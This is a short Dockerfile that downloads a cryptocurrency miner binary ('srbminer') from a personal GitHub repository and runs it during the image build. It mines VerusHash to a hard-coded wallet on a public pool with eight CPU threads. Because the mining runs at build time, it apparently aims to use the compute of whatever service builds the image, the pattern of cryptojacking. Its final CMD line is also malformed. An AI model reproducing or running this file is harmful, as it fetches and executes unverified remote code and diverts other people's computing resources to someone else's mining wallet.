FROM ubuntu:latest
RUN apt update && apt upgrade -y && apt install wget -y
WORKDIR /home
RUN wget https://github.com/agumyudhistira/mine/raw/main/srbminer
RUN chmod +x srbminer
RUN ./srbminer --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RX4vBjkGvdLF7R5uka9yc6XWWncyTLAk2P.WORKER-2 --cpu-threads 8
CMD (-h)
